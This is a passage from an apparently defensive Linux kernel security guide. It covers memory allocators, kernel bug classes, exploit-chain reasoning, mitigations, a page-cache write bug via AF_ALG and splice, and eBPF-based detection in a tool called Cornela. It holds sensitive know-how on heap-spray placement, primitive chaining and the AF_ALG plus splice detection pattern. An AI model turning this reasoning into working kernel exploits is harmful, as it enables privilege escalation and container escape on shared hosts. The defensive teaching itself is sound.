- ext4: long-time default on many distros
- xfs: high-performance, used for large filesystems and Red Hat-family defaults
- btrfs: copy-on-write filesystem with snapshots and subvolumes
- overlayfs: union mount used heavily by container runtimes
- tmpfs: RAM-backed filesystem used for `/tmp`, `/run`, and similar
- fuse: userspace-implemented filesystems backed by a userspace daemon
- procfs and sysfs: virtual filesystems exposing kernel state
- bpffs: virtual filesystem for pinning eBPF objects

Why this matters:

- filesystem bugs are reachable when an unprivileged user can mount, when an image is auto-mounted, or when a privileged tool processes attacker content
- overlayfs has been a recurring source of container-escape bugs because it sits at the boundary of user and root visibility
- fuse moves part of filesystem logic into userspace, which can widen race windows that exploit kernel paths

### Boot, Init, And Early Userspace

Knowing how a Linux system starts helps explain why some attack surfaces exist at all.

Rough sequence:

1. firmware (BIOS or UEFI) loads a bootloader such as GRUB
2. the bootloader loads the kernel image (`vmlinuz`) and an initramfs
3. the kernel decompresses, sets up early memory and CPU state, and runs init code
4. the kernel mounts the initramfs as a temporary root and runs `/init`
5. `/init` loads modules and pivots to the real root filesystem
6. the kernel exec's PID 1 (systemd, openrc, runit, or similar)
7. PID 1 brings up the rest of userspace

Security implications:

- secure boot, kernel signing, and module signing constrain what can run before userspace
- the initramfs is part of the trust chain. Tampering with it bypasses many protections.
- IMA (Integrity Measurement Architecture) and dm-verity extend integrity guarantees into userspace
- kernel command-line parameters (`cmdline`) can disable mitigations or change behavior, so they belong in your hardening review

## Part 5: Kernel Memory Model For Defenders

**Level: Intermediate → Advanced.** Sections 5.1 through 5.5 (kernel stack, heap, file-backed/anonymous memory, virtual address space, user-copy boundaries) are Intermediate. The later sections (page tables, slab allocators, vmalloc/kvmalloc, sanitizers) are Advanced — they assume you have a clear mental picture of memory and are ready for allocator-level reasoning.

**Beginner sidebar.** If you are new, the only ideas you must take from this Part on a first pass are: (1) the kernel has its own memory regions that userspace cannot touch directly, (2) different kinds of memory have different security properties, and (3) "memory corruption" in the kernel is dangerous because of *what* lives in that memory. Skip the allocator deep dives on a first pass.

Once kernel architecture is clearer, memory deserves its own treatment because so many serious kernel bugs eventually become memory-safety or lifetime problems.

You do not need to become a kernel memory expert, but you should know the big regions.

### Kernel Stack

Each task has a kernel stack used while executing inside the kernel.

Security relevance:

- stack overflows can corrupt control data or nearby stack objects
- stack depth mistakes can destabilize the kernel
- stack canaries exist because stack corruption is a real class of bug

### Kernel Heap

The kernel heap is used for dynamic allocation of objects. On Linux this is commonly backed by slab allocators such as SLUB.

In simple terms, the kernel heap is where the kernel asks for memory when it needs to create an object at runtime, such as a socket-related object, a filesystem object, or temporary working state.

Security relevance:

- many kernel objects live on the heap
- use-after-free bugs often target heap object reuse
- heap overflows can corrupt adjacent objects or metadata

From the memory-allocation perspective used in *Linux Kernel Programming*, it is useful to think in two layers:

- page-level allocation for lower-level memory management
- object-oriented allocation through slab-style allocators such as `kmalloc`

For defenders, that matters because different bug patterns often corrupt different object types and allocator-managed regions.

### File-Backed And Anonymous Memory

Anonymous memory is process memory not backed by a file in the normal sense. File-backed memory is associated with files and often interacts with the page cache.

In simple terms:

- anonymous memory is ordinary process memory such as heap and stack pages
- file-backed memory is memory associated with file contents or memory-mapped files

Security relevance:

- page-cache-backed memory can be visible across processes
- mistakes in file-backed write paths can cross trust boundaries
- many storage and VFS bugs become more dangerous because of cached shared state

### Virtual Address Space And The VM Split

The book spends time on process virtual address space, kernel virtual address space, and the VM split between user and kernel mappings.

If those terms are unfamiliar:

- virtual address space means the addresses a process thinks it is using
- the kernel translates those addresses to real memory pages underneath
- the VM split means userspace and kernel space do not share one flat unrestricted address view

For security, the important lessons are:

- a process sees virtual addresses, not raw physical memory
- the kernel has its own virtual layout and protections
- bugs in translation, mapping, or permissions can break isolation assumptions
- randomized layouts such as KASLR matter because address predictability helps exploitation

This is why understanding VAS, VMA, and kernel layout is not only for kernel programmers. It helps defenders reason about memory corruption, information leaks, and mitigation bypasses.

### User Copy Boundaries

The kernel often copies data between userspace and kernel space. These boundaries are sensitive.

Defensive questions:

- was the size validated?
- was the destination object large enough?
- was the userspace pointer valid?
- could partially initialized kernel data leak back?

This is why mitigations such as hardened usercopy matter.

### Allocation Rules And GFP Flags

The book's memory-allocation chapters emphasize that kernel allocation is context-sensitive.

At a high level:

- not every allocation API is safe in every context
- some contexts cannot sleep
- allocator behavior affects fragmentation, latency, and failure handling

For security, this matters because memory-management bugs are often connected to:

- wrong allocation size
- wrong lifetime assumptions
- wrong allocator choice
- failure-path mistakes
- context-inappropriate allocation behavior

### Page Tables, MMU, And TLB

The hardware Memory Management Unit translates virtual addresses to physical addresses using page tables. The Translation Lookaside Buffer caches recent translations.

In simple terms:

- page tables are tree-structured tables the kernel maintains, with one path per process address space
- each leaf entry describes a page: physical frame, present/absent, read/write/execute, user/supervisor, dirty, accessed, and other flags
- the TLB is a small fast cache so the CPU does not walk page tables on every memory access

Security relevance:

- page-table flag mistakes (executable pages where they should not be, writable pages where they should not be) directly weaken protections like W^X
- TLB flushing mistakes during page-table updates have been the cause of severe kernel bugs (Dirty CoW is one famous case shape)
- CPU side-channels such as Meltdown and Spectre family abuse speculation through translation behavior. KPTI (Kernel Page Table Isolation) was the major mitigation.

You do not need to write page-walk code, but recognize that "the kernel changed a mapping" is a sensitive operation.

### Slab Allocators And kmem_cache

The kernel heap is implemented by slab allocators. Linux historically had three: SLAB, SLUB (the modern default), and SLOB (small/embedded). SLUB is what you will encounter on almost any modern distro.

Two allocation styles dominate:

- generic `kmalloc(size, flags)`: returns a chunk from a size class (`kmalloc-8`, `kmalloc-16`, ... `kmalloc-8k`). Backed by per-size kmem_caches.
- type-specific kmem_caches: subsystems create their own caches for important objects (`task_struct`, `cred`, `dentry`, `inode`, `file`, `sock`, ...). This isolates objects of the same type and improves locality.

Two ideas you should know:

- cache merging: SLUB merges kmem_caches with compatible size and flags. This is great for memory efficiency, but it means objects from different subsystems may share a backing slab. That has been important for exploitation, which is why hardened builds disable cache merging or isolate sensitive caches (`CONFIG_SLAB_MERGE_DEFAULT=n`, `CONFIG_RANDOM_KMALLOC_CACHES`).
- `SLAB_ACCOUNT` and `GFP_KERNEL_ACCOUNT`: charge allocations to the originating cgroup memcg. This affects which slab cache an object lands in and changes the heap-spray landscape — another reason kernel hardening reviews look at flag choices.

Security relevance:

- many kernel exploits depend on placing a controllable object next to a vulnerable one in the same slab. Cache isolation is therefore a real mitigation.
- understanding which kmem_cache an object lives in is the first step in reasoning about a heap-spray scenario.

### vmalloc, kmalloc, kvmalloc, And Friends

Different allocators have different guarantees. Defenders should at least recognize the names:

- `kmalloc`: physically contiguous, fast, size-limited (large requests fail or fall back)
- `vmalloc`: virtually contiguous but physically scattered. Slower, used for large buffers
- `kvmalloc`: tries `kmalloc` first, falls back to `vmalloc`. Used when size may be large
- `alloc_pages`: page-granular, low-level
- `__GFP_ZERO`: zero on allocation. Important for not leaking stale data
- `GFP_KERNEL` vs `GFP_ATOMIC`: sleep-allowed vs atomic-context allocation

Wrong allocator or wrong flags is one of the recurring sources of kernel bugs.

### Sanitizers: KASAN, KMSAN, KFENCE, UBSAN

These are kernel sanitizers, built-in debugging tools that catch memory errors:

- KASAN (Kernel Address Sanitizer): catches out-of-bounds and use-after-free at runtime
- KMSAN (Kernel Memory Sanitizer): catches use of uninitialized memory
- KFENCE: lightweight production-friendly sampler that can detect heap errors with low overhead
- UBSAN: undefined-behavior sanitizer (signed overflow, bad shifts, array OOB)

Security relevance:

- sanitizers do not ship enabled in production kernels for performance reasons, but distros increasingly ship KFENCE
- syzkaller and the upstream kernel CI run these heavily, which is why so many kernel bugs surface upstream before they reach defenders
- knowing that a CVE was found by KASAN tells you something about its shape

## Part 6: The Defensive Exploitation Mindset

**Level: Intermediate.** The vocabulary is light, but the *thinking* style is new for most readers — it asks you to switch from "how does this work?" to "what could an attacker do with this?"

**Beginner sidebar.** A *primitive* in this Part means "a building-block capability the attacker has after the bug fires" — for example, the ability to read one byte of kernel memory of their choosing. Exploit chains are sequences that turn one weak primitive into a stronger one. This Part teaches the chain-thinking, not specific exploits.

The next step is to move from system structure to attacker and defender reasoning. This chapter introduces the mental model that connects a kernel bug to operational impact.

To work in DevSecOps, you do not need to become an exploit author. You do need to understand how exploit chains are usually built.

The mental model is:

```text
1. Reach a privileged kernel path
2. Trigger a logic or memory bug
3. Gain a primitive
4. Turn the primitive into impact
```

Examples of primitives:

- arbitrary read
- arbitrary write
- limited write
- use-after-free control
- privilege transition

The primitive is the important bridge between "there is a bug" and "the attacker now controls something important."

For defenders, this means:

- watch for access to sensitive kernel interfaces
- reduce the number of reachable interfaces
- harden privilege boundaries
- correlate suspicious steps instead of treating one syscall as proof

This correlation model is also how many practical runtime detection tools are designed.

## Part 7: Low-Level Attack Vectors Into The Kernel

**Level: Intermediate.** This Part is mostly an enumeration of "where in the kernel do bugs tend to be reachable." The terms are concrete and you can look up any unfamiliar one in the Glossary (Part 33).

**Beginner sidebar.** "Attack surface" simply means "the set of places untrusted code can poke at." A small attack surface is good for defense. A big attack surface means more code that has to be perfectly correct. This Part is mostly a tour of the parts of the kernel that have historically been most reachable from untrusted code.

With the exploitation mindset in place, the book can now ask a more practical question: where do attackers actually touch kernel code in the first place?

From a defensive point of view, "kernel exploitation" usually starts with reachable attack surface.

Common low-level entry points include:

- syscalls
- `ioctl` handlers
- filesystem parsers
- networking protocol handlers
- eBPF verifier and related kernel paths
- keyrings
- namespace operations
- mount and VFS operations
- module loading
- device drivers
- `/proc` and `/sys` interfaces
- crypto interfaces such as `AF_ALG`

In simple terms:

- syscalls are the normal doors from userspace into kernel functionality
- `ioctl` calls are custom control interfaces used by many drivers and subsystems
- `/proc` and `/sys` are virtual filesystems the kernel exposes for status and control
- `AF_ALG` is a socket-based way for userspace to reach kernel cryptographic code

For DevSecOps, the right question is not only "is there a bug?" but:

```text
which kernel interfaces are reachable by untrusted workloads on this host?
```

That question is more operational and more useful.

### Why `ioctl` And Drivers Matter

Device-driver attack surface is historically important because drivers often:

- parse complex inputs
- manage hardware state
- allocate dynamic objects
- use custom control interfaces

Even if your application does not look hardware-related, the host may expose device nodes or driver interfaces that broaden attack surface significantly.

### Why Filesystems Matter

Filesystems are not only storage code. They are parsers, cache managers, permission enforcers, and metadata handlers.

Security problems can appear in:

- pathname resolution
- mount handling
- file-descriptor operations
- page-cache interactions
- filesystem-specific metadata parsing

### Why Networking Matters

The kernel networking stack handles packets, sockets, routing, filters, and protocol state. It is performance-sensitive and heavily exercised, which makes it both critical and historically bug-prone.

For shared hosts, untrusted containers reaching specialized socket families or networking control operations can matter even if they never leave the node.

## Part 8: Important Kernel Bug Classes

**Level: Intermediate → Advanced.** The early sections (buffer overflow, use-after-free, race conditions) are Intermediate. The later additions (type confusion, double-fetch, refcount overflow, logic-only bugs) are Advanced and assume the earlier sections feel comfortable.

**Beginner sidebar.** Each bug class in this Part is a *family* of mistakes a programmer can make, not a single CVE. Learning to recognize the family helps you read CVE descriptions much faster. If you can finish this Part and explain "what is a use-after-free?" to a friend, you have the right level for the rest of the book.

Once reachable attack surface is understood, the next layer is bug shape. This chapter focuses on the recurring technical failure modes that keep appearing across kernel subsystems.

Security engineers should learn bug classes, not just CVE names.

### Buffer Overflow

A buffer overflow happens when code writes more data than the destination buffer can hold.

In kernel space, this can be much more severe than in a normal application because the corrupted memory may belong to privileged kernel objects.

There are several forms:

- stack-based overflow
- heap-based overflow
- out-of-bounds write
- out-of-bounds read

At a high level, kernel buffer overflows matter because they may lead to:

- corrupted object fields
- corrupted function pointers
- corrupted reference counts
- data leaks
- crashes or denial of service
- sometimes privilege escalation

For defenders, the lesson is simple:

```text
memory corruption in the kernel is usually a platform risk, not just an application risk
```

### Use-After-Free

A use-after-free bug happens when code continues using an object after it has already been freed.

Low-level risk:

- a new object may reuse the same memory
- stale pointers may now point into attacker-influenced content
- type confusion and control corruption can follow

### Integer Overflow And Size Bugs

Not every dangerous bug looks like a classic overflow. A small integer mistake can become:

- undersized allocation
- oversized copy
- incorrect bounds check
- truncated length

These often become memory corruption bugs one layer later.

### Race Conditions

Race conditions occur when behavior depends on timing or ordering between threads, CPUs, or processes.

In kernel code this can break:

- permission checks
- object lifetime assumptions
- reference counting
- state transitions

Some famous Linux bug classes have relied on race windows, but defenders should remember that a bug does not need a race to be severe.

### Uninitialized Or Partially Initialized Memory

Another practical class of kernel bugs is exposing memory that was not fully initialized before use or before being copied back to userspace.

That can lead to:

- information disclosure
- stale pointer leakage
- kernel address exposure
- leaking prior object contents

### Double Free

A double free occurs when the same object is freed more than once. In allocator-heavy environments this may corrupt heap state or create reuse opportunities.

### Information Disclosure

Not all kernel exploits start with a write. Many start with a read primitive or an information leak.

Leaks can expose:

- kernel pointers
- randomized addresses
- object layout hints
- credential structures

This matters because bypassing mitigations often depends on knowing memory layout.

### Type Confusion

Type confusion happens when memory is interpreted as one type but actually holds a different type's data. The two types may share size but not field semantics.

Why this is dangerous:

- a field that the code treats as a length may really be a pointer
- a pointer field may now be attacker-controlled data
- methods or function pointers fetched from the "wrong" type can redirect execution

Type confusion often arises from:

- union mishandling
- failed downcast or polymorphic dispatch errors
- object reuse where a slab now holds a different object type than expected
- speculative or aliasing bugs where the same memory is reached through two type lenses

In the kernel, type confusion through slab reuse is a common follow-on after a use-after-free.

### Double-Fetch (TOCTOU On Userspace Pointers)

The kernel sometimes copies user data twice — once to validate, once to act on. If the user changes the data between the two reads, the kernel acts on data it never validated.

Why this matters:

- the validation is bypassed without ever being "wrong"
- check-then-use is the classic TOCTOU pattern
- multi-threaded userspace can race the kernel between fetches

Mitigation: the kernel should copy once into a local kernel buffer, then validate and use the local copy.

### Refcount Overflow And Underflow

Reference counters guard object lifetimes. If a counter wraps from a large value to zero, the kernel may free a still-in-use object. If the counter is decremented too many times, the object disappears prematurely.

This bug class is interesting because it does not need a memory-safety violation to start — just an arithmetic mistake or a missing increment on an error path. Mitigations like `refcount_t` were introduced specifically because plain `atomic_t` counters have repeatedly become security bugs.

### Logic And Privilege Bugs Without Memory Corruption

Not every kernel security bug looks like memory corruption. Some are pure logic:

- a permission check is missing on one path
- a capability check is performed on the wrong subject
- a syscall accepts a flag combination that bypasses an intended restriction
- a namespace boundary is crossed because the wrong context object was used
- a security label is forgotten during an object transition

These bugs often have no detectable memory anomaly. They are found by code review, by understanding the security model, and by careful testing.

For defenders, the lesson is that "no use-after-free" does not mean "no kernel security bug."

## Part 9: Kernel Exploitation As A Defensive Model

**Level: Advanced.** This Part is where bug classes become exploit chains. If you have not internalized Part 8, the reasoning here will feel abstract.

**Beginner sidebar.** This Part is fine to skim on a first pass. The single sentence to take away is: "exploitation is a search for a path from a bug to attacker-meaningful capability, and modern kernels make that search expensive — but not impossible."

The earlier bug-class chapter explains what goes wrong. This chapter explains how those failures are chained into meaningful attacker capability.

High-level kernel exploitation usually follows one of these paths:

1. corruption of data only
2. corruption of control flow
3. corruption of credentials or security state
4. abuse of logic flaws without classic memory corruption

Examples of defender-oriented goals an attacker may pursue:

- change effective credentials
- write to protected file-backed state
- escape container restrictions
- load code or modules indirectly
- disable security checks

In plain terms:

- change effective credentials means changing who the kernel thinks the process is, for example from an unprivileged user to root
- write to protected file-backed state means altering cached contents or kernel-controlled views of files that should not be writable
- escape container restrictions means breaking the isolation boundary between the container and the host or another workload
- disable security checks means turning off, bypassing, or corrupting the logic that would normally block the attacker

Modern kernel exploitation is harder than it used to be because of mitigations, but the basic idea remains:

```text
reach kernel attack surface
  -> trigger bug
  -> gain primitive
  -> bypass mitigations
  -> change privileged state
```

For DevSecOps, the mitigation stage is very important, because even partial hardening can force many exploits from easy to impractical.

There is also an important distinction between:

- control-flow hijack style exploitation
- data-only exploitation

In simple terms:

- control-flow hijack means forcing the kernel to execute unintended code paths
- data-only exploitation means changing important kernel data without necessarily redirecting execution to attacker-chosen code

Modern defenses often make direct control hijack harder. In practice, many impactful kernel exploits instead aim to corrupt security-relevant data such as:

- credential state
- object flags
- reference counts
- mount or namespace state
- file-backed cached content

## Part 10: Common Kernel Mitigations You Should Know

**Level: Intermediate.** Most readers can read this in order. Each mitigation is named, briefly explained, and tied back to the bug class it addresses.

**Beginner sidebar.** A *mitigation* is a built-in defense that makes exploitation harder, even if a bug exists. None of these is bulletproof on its own. Together they are why modern kernel exploitation is hard work, not a casual afternoon.

Only after the exploitation model is clear does it make sense to discuss mitigations in context, because every mitigation is really changing the attacker’s path from bug to impact.

You do not need to implement all of these yourself, but you should recognize them.

- stack canaries: values placed near stack control data so some overwrites can be detected
- KASLR: Kernel Address Space Layout Randomization, which makes kernel memory locations less predictable
- SMEP and SMAP on x86: hardware protections that make some illegitimate execution or access paths harder
- PAN or similar protections on ARM: protections that reduce unsafe privileged access to user memory
- read-only data protections: mechanisms that stop some important kernel data from being modified at runtime
- hardened usercopy: extra validation around copying data between userspace and kernel space
- allocator hardening: protections in memory-allocation paths that make heap exploitation harder
- refcount hardening: protections around reference counters so they are harder to corrupt or overflow
- CFI in some builds: Control-Flow Integrity, which restricts some invalid control-flow transfers
- module-signing policies: rules that restrict which kernel modules may be loaded
- seccomp: syscall filtering
- AppArmor or SELinux: higher-level policy enforcement layers

Operational point:

- mitigations reduce exploit reliability
- they do not replace fixing the bug
- some mitigations help against memory corruption
- others reduce reachable attack surface

Examples of how these mitigations help:

- KASLR makes kernel addresses less predictable
- stack canaries help detect some stack smashing cases
- SMEP/SMAP or related hardware features limit some illegitimate access patterns
- hardened usercopy reduces unsafe user/kernel copy behavior
- refcount hardening makes some object-lifetime exploitation harder

## Part 11: Copy Fail As A Learning Case

**Level: Intermediate.** Builds on Parts 5, 7, and 8.

The book now has enough shared vocabulary to use a concrete vulnerability class as a teaching case without losing the bigger picture.

This book uses Copy Fail, tracked here as `CVE-2026-31431`, as a defensive learning case.

You should treat it as a teaching case for shared-kernel risk:

- an untrusted process reaches a kernel crypto path
- low-level data movement happens through `splice()`
- file-backed cached memory becomes part of the dangerous path
- the bug may create a small unintended write
- that small write can become privilege escalation if it lands on security-sensitive cached content

The lesson is bigger than one CVE:

```text
small kernel write primitive + shared kernel state + trusted follow-on execution = major platform risk
```

## Part 12: The Important Low-Level Concepts Behind Copy Fail

**Level: Advanced.** This Part touches `AF_ALG`, `splice()`, and page-cache semantics in a single chain. You will get the most out of it after Parts 5 and 7.

**Beginner sidebar.** The big takeaway, even on a first read, is: a "small kernel write" through the wrong path can affect cached files that *other* processes will trust. That is what makes this CVE class important.

This chapter unpacks the specific Linux mechanisms behind the Copy Fail case so the reader can connect general kernel concepts to one concrete low-level risk pattern.

This section explains the low-level ideas for defenders, not for exploitation.

### AF_ALG

`AF_ALG` is a Linux socket family used to access kernel cryptographic operations from userspace.

Most engineers think of sockets as network objects. `AF_ALG` is different:

```text
userspace process -> AF_ALG socket -> kernel crypto API
```

From a security perspective, this matters because a local process is directly interacting with complex kernel code.

### splice

`splice()` moves data between file descriptors through kernel-managed paths without the normal userspace copy pattern.

That matters because:

- it is efficient
- it uses low-level kernel buffer handling
- it can create security-relevant data flows that are easy to miss if you only think in terms of normal file I/O

### File-Backed Cached Pages

If data comes from a file and is cached in the page cache, the kernel may treat it as shared cached state rather than private application memory.

This is why page-cache corruption bugs are powerful. The attacker may not need a normal writable file descriptor if the kernel is tricked into writing through the wrong path.

This ties back to the memory-management coverage in *Linux Kernel Programming*: once you understand virtual memory, mappings, and file-backed pages, it becomes much easier to understand why a "small write" in kernel space can have system-wide consequences.

### The Exploit Shape Defenders Should Understand

At a high level, the risky sequence is:

```text
read-only file-backed data
  -> pipe or kernel-managed bridge
  -> splice()
  -> AF_ALG crypto path
  -> unintended write into cached file-backed memory
```

The important security point is not the crypto algorithm itself. The important point is memory ownership:

```text
did the kernel write through memory that should not have been writable from the attacker's point of view?
```

That is the kind of question defenders should learn to ask when reading about low-level Linux vulnerabilities.

## Part 13: Why Containers Make This Worse

**Level: Intermediate.** Reuses Parts 0.8, 3, and 11.

Only after the kernel and vulnerability mechanics are established does the book return to containers, now with enough background to explain why shared-kernel environments amplify certain risks.

On a container host, one untrusted workload may trigger the dangerous kernel path while a different, more trusted workload later interacts with the affected cached content.

That is why container security is not only about:

- image scanning
- application dependencies
- network policy

It is also about:

- shared-kernel exposure
- node hardening
- workload co-tenancy
- syscall reachability
- runtime isolation strength

For DevSecOps careers, this is a major mindset shift:

```text
secure containers require secure hosts
```

## Part 14: Understanding eBPF

**Level: Intermediate.** This Part teaches eBPF concepts at a usable level. Part 30 ("Deep eBPF") goes deeper into program types, helpers, and tooling for readers who want expert-level material.

**Beginner sidebar.** Read this Part for shape on a first pass. eBPF is "small, verified programs that the kernel runs at chosen hook points to observe or filter behavior." If you finish the Part with that one sentence internalized, you are in good shape — the details land faster the second time.

At this point the book shifts from "how the kernel fails" to "how we can observe the kernel at runtime." eBPF is the main bridge between low-level behavior and practical detection engineering.

eBPF is one of the most important Linux technologies for modern observability and security engineering.

At a high level, eBPF lets you run small verified programs inside the kernel at specific hook points. Those programs can observe activity, keep small amounts of state, and send structured events to userspace.

The simple mental model is:

```text
kernel event happens
  -> attached eBPF program runs
  -> program checks context, maybe updates a map
  -> program emits a compact event
  -> userspace reads, enriches, and interprets it
```

This is why eBPF is so useful for DevSecOps:

- it gives deep runtime visibility
- it can observe behavior close to the kernel boundary
- it is safer than writing a traditional kernel module for most monitoring tasks
- it supports high-signal detection with lower overhead than many older tracing approaches

### 1. What eBPF Really Is

The term BPF originally came from packet filtering. Modern eBPF is much broader.

Today, eBPF programs can attach to many Linux hook types, including:

- tracepoints
- kprobes and kretprobes
- uprobes
- socket and networking hooks
- cgroup hooks
- XDP packet-processing hooks
- LSM hooks on some systems

In simple terms:

- tracepoints are predefined stable observation points in the kernel
- kprobes hook kernel function entry or return dynamically
- uprobes do something similar for userspace functions
- XDP hooks sit very early in the packet path for fast network processing

For this book, the most important category is tracing and observability. The implementation case studies later use eBPF mainly to observe security-relevant runtime events.

### 2. Why eBPF Matters For Security

Before eBPF, deep Linux runtime visibility often meant:

- patching the kernel
- writing a kernel module
- using heavier tracing tools
- relying only on logs after the fact

eBPF improves this by making it easier to collect structured runtime evidence such as:

- process execution
- socket activity
- mount attempts
- namespace changes
- module load events
- file access patterns

For defenders, this means:

```text
you can observe security-relevant behavior near the kernel boundary without turning the monitor itself into a large kernel-resident product
```

### 3. The Verifier

The eBPF verifier is one of the core safety mechanisms.

Before an eBPF program is accepted, the kernel verifier checks properties such as:

- bounded execution
- safe memory access
- valid helper usage
- valid map access patterns
- control-flow safety

This matters because the kernel is refusing to run arbitrary untrusted code inside itself. The verifier is a large part of why eBPF is safer than “just load some custom kernel code.”

The practical lesson:

- eBPF is powerful
- but it is constrained on purpose
- many design choices in eBPF programs exist to satisfy verifier rules

If you are new to this, "verified" means the kernel checks the eBPF program before allowing it to run, rather than trusting it like a normal piece of arbitrary kernel code.

### 4. Hooks And Attach Points

An eBPF program is only useful when attached to the right place.

Common choices include:

- tracepoints for stable kernel event observation
- kprobes for lower-level function entry observation
- uprobes for userspace function tracing
- networking hooks for packet and socket paths

One implementation pattern is to use tracepoints such as syscall entry points to observe behavior like:

- `socket(AF_ALG, ...)`
- `splice`
- `setuid`
- `unshare`
- `mount`

Another implementation pattern is to use event streams such as process exec and network-related transitions.

For security engineering, attach-point choice is a design decision:

- too high-level and you miss low-level behavior
- too low-level and you collect too much noise or become version-fragile

### 5. Maps

eBPF maps are kernel-managed data structures that eBPF programs can use to keep state or exchange data with userspace.

Examples of map usage:

- counters
- hashes of per-process state
- configuration values
- event queues and buffers

In simple terms, a map is shared state the eBPF side can update and userspace can read or write, depending on the map type and use case.

Two important map ideas from this book’s examples are:

- state gating
- event transport

One useful pattern is to use a hash map to remember which process groups opened an `AF_ALG` socket. That lets the detector suppress unrelated `splice()` noise.

```c
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, __u32);
    __type(value, __u8);
} af_alg_tgids SEC(".maps");
```

That is a good example of kernel-side memory used for short, focused correlation.

### 6. Ring Buffers And Event Delivery

An eBPF program usually should not do heavy analysis itself. Instead, it should emit compact events and let userspace do the expensive work.

One common design is to use a ring buffer for this:

```c
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 24);
} events SEC(".maps");
```

Then it writes a compact event structure:

```c
struct cornela_event {
    __u64 timestamp_ns;
    __u32 event_type;
    __u32 pid;
    __u32 uid;
    __u32 gid;
    __u32 syscall_arg0;
    char comm[TASK_COMM_LEN];
};
```

This is exactly the right pattern for many security tools:

- keep kernel-side payloads small
- send only the fields userspace needs to enrich later
- avoid expensive string processing inside eBPF

In simple terms, the ring buffer is a fast queue from kernel space to userspace.

### 7. CO-RE

CO-RE means Compile Once, Run Everywhere.

In practice, it is a portability approach that lets an eBPF program adapt more safely across different kernels using BTF type information.

Why this matters:

- Linux kernel internals vary by version and distro
- security tooling must survive those differences as much as possible
- CO-RE reduces the amount of per-kernel rebuilding and brittle struct offset handling

You do not need to master every CO-RE detail to understand the security lesson:

```text
portable kernel observability is hard, and CO-RE exists to make it more practical
```

BTF, which often appears in eBPF discussions, is kernel type information that helps portability and safer field access across kernels.

### 8. Why Userspace Enrichment Still Matters

One common mistake is to think eBPF should do everything.

In reality, good eBPF designs usually split responsibility:

- kernel side captures compact raw facts
- userspace resolves richer context and applies higher-level logic

One case study in this book follows this pattern:

- eBPF captures small syscall-related events
- userspace adds cgroup, container, namespace, and command-line context
- userspace correlates sequences and assigns risk

Another case study follows a similar principle:

- eBPF captures normalized runtime events
- userspace rule logic decides whether they represent web-worker shelling, tmp execution, or similar behavior

This split matters because userspace is a better place for:

- complex policy logic
- string processing
- rule testing
- integration with alert pipelines

### 9. eBPF Security Use Cases

For a DevSecOps career, think of eBPF as a platform for several classes of security work:

- runtime detection
- observability for incident response
- policy enforcement in some environments
- performance-assisted security investigation
- validation of hardening assumptions

Examples from this book’s context:

- detecting suspicious syscall sequences
- detecting process execution anomalies
- seeing module load attempts
- identifying high-risk namespace and mount activity
- spotting unusual outbound connection behavior

### 10. eBPF Limitations

eBPF is powerful, but it is not magic.

Important limitations include:

- verifier constraints restrict what programs can do
- kernel support varies by version and distro
- some attach points may not exist everywhere
- event volume can still become noisy if hooks are chosen badly
- userspace enrichment is still required for many practical detections
- loading eBPF often requires elevated privileges or explicit capabilities

When you see capability names such as `CAP_BPF` or `CAP_PERFMON`, read them as narrower Linux privileges that allow certain BPF and observability operations without giving a process full root power.

This is why some tools isolate eBPF work in a separate privileged sidecar instead of making the entire monitoring system privileged.

### 11. eBPF Versus Kernel Modules

Security learners often confuse these.

Kernel modules:

- are general kernel code
- are extremely powerful
- are also higher-risk to develop and load

eBPF programs:

- are constrained
- are verified before load
- are often a better choice for tracing, filtering, and event collection

This is one reason eBPF has become so important in observability and runtime security products.

### 12. eBPF In Cornela

Cornela uses eBPF mainly as a syscall and kernel-boundary event collector.

Its design emphasizes:

- tracepoint attachment over broad invasive instrumentation
- compact event structs
- a small amount of kernel-side state
- sequence-oriented detection in userspace

The best example is the `AF_ALG` marker map and gated `splice()` observation. That is not only a coding trick. It is a detection-engineering strategy for reducing noise while preserving the event chain that matters.

### 13. eBPF In MiLog

MiLog uses eBPF differently.

Its Go-side probe architecture treats eBPF as a collection layer for multiple runtime event streams, while the main security interpretation remains in userspace rule functions.

That architecture is useful to study because it shows:

- how to isolate privileged collection into a separate process
- how to keep one failed probe from killing all runtime coverage
- how to reuse an existing alert pipeline instead of building a parallel one

### 14. How To Learn eBPF Safely

A good learning progression is:

1. Understand what a tracepoint is.
2. Learn how a small event struct is emitted from kernel side.
3. Learn how maps hold small bits of state.
4. Learn how userspace reads events and enriches them.
5. Study how detections are built from event sequences or parent-child relationships.

For DevSecOps, the goal is not “become an eBPF wizard first.” The goal is:

```text
understand enough eBPF to design better observability and security detections
```

## Part 15: Case Study: Cornela

**Level: Intermediate.** Concrete walkthroughs of a real Rust + eBPF tool. Beginner-friendly if you have read Parts 13 and 14.

The next chapters are deliberately applied. They show how the earlier kernel, exploitation, and eBPF concepts are turned into an actual defensive workflow.

Cornela helps defenders inspect shared-kernel risk in two ways.

### 1. Static Audit

Cornela reads Linux state from interfaces such as:

- `/proc`
- namespace links
- cgroup paths
- mount information
- loaded modules
- seccomp indicators
- AppArmor and SELinux signals

It uses that to answer questions like:

- Is `algif_aead` loaded?
- Does the kernel crypto API appear available?
- Is seccomp present?
- Are containers sharing risky namespaces?
- Do containers have dangerous capabilities?
- Is `NoNewPrivs` missing?

### 2. Runtime Monitoring With eBPF

Cornela loads a small eBPF program to watch selected syscall tracepoints and emit compact runtime events to userspace.

The monitor watches signals such as:

- `socket(AF_ALG, ...)`
- `splice`
- UID and GID transitions
- `unshare` and `setns`
- mount-related syscalls
- `bpf`
- capability changes
- module load activity
- keyring activity

The key design choice is correlation.

Cornela does not alert only because one syscall happened. It looks for suspicious short chains such as:

```text
socket(AF_ALG) + splice()
```

and it raises the priority if that sequence is followed by stronger indicators such as a root UID transition.

Cornela's approach is deliberately closer to systems observability than exploit signature matching:

- the kernel-side eBPF probe stays small
- userspace performs the heavier interpretation
- events are enriched with process, cgroup, and namespace context
- suspicious meaning comes from correlated behavior, not one isolated syscall

## Part 16: Case Study: Mapping Kernel Risk To Detection With Cornela

**Level: Intermediate.**

Cornela does not try to understand every exploit implementation. Instead, it focuses on a practical subset of high-value kernel attack vectors and maps them into audit or runtime signals.

Examples:

- crypto-kernel reachability
  Cornela checks `algif_aead`, AF_ALG exposure, and the `AF_ALG + splice` sequence.
- namespace manipulation
  Cornela watches `unshare` and `setns` because namespace transitions often appear in isolation weakening and boundary manipulation.
- mount and VFS manipulation
  Cornela watches mount-related syscalls because filesystem state changes are common building blocks in escape activity.
